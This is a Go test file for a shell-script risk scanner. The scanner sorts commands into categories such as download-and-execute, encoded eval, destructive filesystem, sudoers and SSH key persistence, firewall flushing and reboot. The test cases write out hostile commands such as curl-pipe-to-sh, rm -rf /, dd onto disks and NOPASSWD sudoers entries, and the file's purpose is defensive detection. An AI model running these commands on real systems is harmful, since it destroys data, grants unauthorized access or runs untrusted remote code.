// SPDX-License-Identifier: AGPL-3.0-or-later

package scanner

import (
	"strings"
	"testing"

	"github.com/nebula-operation-station/nebula-operation-station/internal/canonical"
)

func TestFindings(t *testing.T) {
	cases := map[string]string{
		"curl -fsSL https://x.example/i.sh | sh":            DownloadExecute,
		"wget -qO- https://x.example/i | sudo -n bash":      DownloadExecute,
		"curl -s https://x | python3 -":                     DownloadExecute,
		"bash <(curl -s https://x)":                         DownloadExecute,
		`sh -c "$(curl -fsSL https://x)"`:                   DownloadExecute,
		`eval "$cmd"`:                                       EvalEncoded,
		`x=1; eval $x`:                                      EvalEncoded,
		"echo aGkK | base64 -d | sh":                        EvalEncoded,
		"printf %s \"$p\" | base64 --decode | /bin/bash":    EvalEncoded,
		"xxd -r -p f | sh":                                  EvalEncoded,
		"rm -rf /":                                          DestructiveFS,
		"sudo -n rm -rf --no-preserve-root /":               DestructiveFS,
		`rm -rf "/*"`:                                       DestructiveFS,
		"mkfs.ext4 /dev/sdb1":                               DestructiveFS,
		"dd if=/dev/zero of=/dev/sda bs=1M":                 DestructiveFS,
		"cat img > /dev/nvme0n1":                            DestructiveFS,
		"wipefs -a /dev/sdb":                                DestructiveFS,
		"update-grub":                                       Bootloader,
		"sed -i s/x/y/ /etc/default/grub":                   Bootloader,
		"useradd -m bob":                                    UsersGroups,
		"echo 'bob ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers": UsersGroups,
		"cat k.pub >> ~/.ssh/authorized_keys":               UsersGroups,
		"sudo -n iptables -F":                               NetworkFirewall,
		"nft flush ruleset":                                 NetworkFirewall,
		"ip route del default":                              NetworkFirewall,
		"netplan apply":                                     NetworkFirewall,
		"apt-get -y purge openssh-server":                   PackageRemoval,
		"apt autoremove -y":                                 PackageRemoval,
		"dpkg -P foo":                                       PackageRemoval,
		"sudo -n reboot":                                    RebootPower,
		"if x; then /sbin/shutdown -h now; fi":              RebootPower,
		"systemctl poweroff":                                RebootPower,
		"echo b > /proc/sysrq-trigger":                      RebootPower,
		"docker rm -f web":                                  DockerRemoval,
		"docker system prune -af":                           DockerRemoval,
		"docker compose -p x down":                          DockerRemoval,
		"timeout 30 sudo -n reboot":                         RebootPower,
		"curl -s https://x \\\n  | sh":                      DownloadExecute,
		"true && reboot":                                    RebootPower,
	}
	for script, want := range cases {
		f, floor := Scan([]byte(script))
		if len(f) == 0 || f[0].Category != want || floor == "" {
			t.Errorf("%q: %+v, want %s", script, f, want)
		}
	}
}

func TestClean(t *testing.T) {
	for _, script := range []string{
		"# rm -rf / is what we never do",
		`printf '{"reboot_required":%s}' "$r"`,
		"[ -f /var/run/reboot-required ] && r=true",
		"apt-get -s -o Debug::NoLocking=1 upgrade",
		"apt-get -y install --only-upgrade openssl",
		"rm -rf \"$tmp\"",
		"rm -f /tmp/x",
		"docker ps --format '{{.Names}}'",
		"systemctl restart nginx.service",
		"journalctl -u ssh -n 50",
		"echo evaluation",
		"cat /etc/os-release",
		"curl -fsI https://registry-1.docker.io/v2/",
		"base64 -w0 < f",
	} {
		if f, floor := Scan([]byte(script)); len(f) != 0 || floor != "" {
			t.Errorf("%q: %+v", script, f)
		}
	}
}

func TestFloorAndLimits(t *testing.T) {
	f, floor := Scan([]byte("useradd x\nreboot\ncurl x | sh\n"))
	if floor != canonical.RiskHigh || len(f) != 3 || f[2].Line != 3 {
		t.Fatalf("%v %+v", floor, f)
	}
	if got := Categories(f); strings.Join(got, ",") != "download_and_execute,reboot_or_power,users_and_groups" {
		t.Fatal(got)
	}
	big := strings.Repeat("reboot\n", 200)
	if f, floor := Scan([]byte(big)); len(f) != MaxFindings || floor != canonical.RiskMedium {
		t.Fatal(len(f), floor)
	}
	// Excerpts are ASCII-quoted and short.
	f, _ = Scan([]byte("eval \"\x1b[2J\u202e" + strings.Repeat("a", 300) + "\""))
	if len(f) != 1 || strings.ContainsAny(f[0].Excerpt, "\x1b\u202e") || len(f[0].Excerpt) > 3*maxExcerpt {
		t.Fatalf("%+v", f)
	}
}

func FuzzScan(f *testing.F) {
	f.Add([]byte("curl x | sh\\\n reboot"))
	f.Fuzz(func(t *testing.T, b []byte) {
		fs, floor := Scan(b)
		if len(fs) > MaxFindings || (len(fs) > 0 && floor == "") {
			t.Fatal("bad result")
		}
	})
}
